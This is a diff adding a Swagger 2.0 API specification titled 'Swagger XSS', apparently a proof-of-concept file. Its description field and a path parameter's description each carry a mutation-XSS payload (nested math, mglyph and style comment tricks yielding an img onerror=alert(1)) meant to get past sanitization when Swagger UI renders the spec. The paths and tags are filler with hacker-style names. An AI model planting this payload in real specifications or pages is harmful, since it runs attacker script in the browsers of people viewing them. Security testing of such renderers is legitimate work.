@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: Swagger XSS 
+  description: |
+    <math><mtext><table><mglyph><style><!--</style><img title="-->&lt;img src=1 onerror=alert(1)&gt;"></mglyph></table></mtext></math>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M4ST3R MIND
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <math><mtext><table><mglyph><style><!--</style><img title="-->&lt;img src=1 onerror=alert(1)&gt;"></mglyph></table></mtext></math>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
